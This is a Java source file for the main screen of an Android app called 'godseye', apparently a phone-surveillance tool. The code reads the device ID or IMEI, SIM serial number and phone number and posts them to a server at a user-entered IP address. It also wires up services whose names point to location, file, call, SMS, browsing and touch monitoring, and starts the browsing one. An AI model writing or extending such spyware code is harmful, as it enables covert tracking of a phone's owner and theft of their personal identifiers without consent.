package com.android.godseye;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    EditText e1;
    Button b1;
    SharedPreferences sh;
    String deviceId = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        e1 = findViewById(R.id.editTextTextPersonName3);
        b1 = findViewById(R.id.button);

        //startService(new Intent(getApplicationContext(),GlobalTouchService.class));
        sh = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        e1.setText(sh.getString("ip", ""));
        b1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                String getSimSerialNumber="";
                String getSimNumber="";

                String ip=e1.getText().toString();
                SharedPreferences.Editor ed = sh.edit();
                ed.putString("ip", ip);

                ed.commit();


                if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    deviceId = Settings.Secure.getString(
                            getApplicationContext().getContentResolver(),
                            Settings.Secure.ANDROID_ID);

                    ed.putString("imei", deviceId);
                    ed.commit();
                    Toast.makeText(getApplicationContext(),"small"+ deviceId, Toast.LENGTH_LONG).show();




                } else {
                    final TelephonyManager mTelephony = (TelephonyManager) getApplicationContext().getSystemService(getApplicationContext().TELEPHONY_SERVICE);
                    if (mTelephony.getDeviceId() != null) {
                        deviceId = mTelephony.getDeviceId();

                        ed = sh.edit();

                        ed.putString("imei", deviceId);
                        ed.commit();
                        Toast.makeText(getApplicationContext(),"small"+ deviceId, Toast.LENGTH_LONG).show();


                    } else {
                        deviceId = Settings.Secure.getString(
                                getApplicationContext().getContentResolver(),
                                Settings.Secure.ANDROID_ID);
                        Toast.makeText(getApplicationContext(),"small"+ deviceId, Toast.LENGTH_LONG).show();

                        ed = sh.edit();

                        ed.putString("imei", deviceId);
                        ed.commit();

                    }
                    getSimSerialNumber = mTelephony.getSimSerialNumber();

                    Toast.makeText(getApplicationContext(),"small"+ getSimSerialNumber, Toast.LENGTH_LONG).show();
//
//
//
                    if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                        // TODO: Consider calling
                        //    ActivityCompat#requestPermissions
                        // here to request the missing permissions, and then overriding
                        //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                        //                                          int[] grantResults)
                        // to handle the case where the user grants the permission. See the documentation
                        // for ActivityCompat#requestPermissions for more details.
                        return;
                    }
                     getSimNumber = mTelephony.getLine1Number();
                    ed = sh.edit();

                    ed.putString("imei", deviceId);
                    ed.commit();
                Toast.makeText(getApplicationContext(),"small"+getSimNumber,Toast.LENGTH_LONG).show();





                }


                Toast.makeText(getApplicationContext(),"small/big"+deviceId,Toast.LENGTH_LONG).show();





//                String deviceUniqueIdentifier = null;
//                deviceUniqueIdentifier = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
//                TelephonyManager tm = (TelephonyManager) getSystemService(getApplicationContext().TELEPHONY_SERVICE);
////                Toast.makeText(getApplicationContext(), "ss"+deviceUniqueIdentifier, Toast.LENGTH_LONG).show();
//
//


               insert(getSimNumber,getSimSerialNumber,deviceId);

                Intent ii=new Intent(getApplicationContext(),LocationService.class);
           //     startService(ii);

                Intent iialaram=new Intent(getApplicationContext(),alarmservice.class);
//                startService(iialaram);

                Intent iifile=new Intent(getApplicationContext(),fileservice.class);
//                startService(iifile);

//
//                Intent iis=new Intent(getApplicationContext(),GlobalTouchService.class);
//               startService(iis);


                Intent iib=new Intent(getApplicationContext(),Callser.class);
        //        startService(iib);

                Intent sout=new Intent(getApplicationContext(),SmsOut.class);
    //            startService(sout);



                Intent sbr=new Intent(getApplicationContext(), BrowsingService.class);
                startService(sbr);







            }
        });


    }

    public  void insert(String simno,String simserialno,String deviceid)
    {
        SharedPreferences sh=PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        String url = "http://" + sh.getString("ip","") + ":5000/sim_insert_post";


        Toast.makeText(getApplicationContext(),"ivideee",Toast.LENGTH_LONG).show();
        RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext());
        StringRequest postRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        Toast.makeText(getApplicationContext(), response, Toast.LENGTH_LONG).show();

                        // response
                        try {
                            JSONObject jsonObj = new JSONObject(response);
                            if (jsonObj.getString("status").equalsIgnoreCase("ok")) {


                            }


                            // }
                            else {
                                Toast.makeText(getApplicationContext(), "Errorrrrrrrrrrrrrrrrrrrrrrrr", Toast.LENGTH_LONG).show();

                            }

                        }    catch (Exception e) {
                            Toast.makeText(getApplicationContext(), "Error" + e.getMessage().toString(), Toast.LENGTH_SHORT).show();
                        }
                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        // error
                        Toast.makeText(getApplicationContext(), "eeeee" + error.toString(), Toast.LENGTH_SHORT).show();
                    }
                }
        ) {
            @Override
            protected Map<String, String> getParams() {
                SharedPreferences sh = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
                Map<String, String> params = new HashMap<String, String>();



                params.put("imei",deviceid);
                params.put("simserialno",simserialno);
                params.put("simno",simno);
                params.put("deviceid",deviceid);


                return params;
            }
        };

        int MY_SOCKET_TIMEOUT_MS=100000;

        postRequest.setRetryPolicy(new DefaultRetryPolicy(
                MY_SOCKET_TIMEOUT_MS,
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        requestQueue.add(postRequest);
    }

}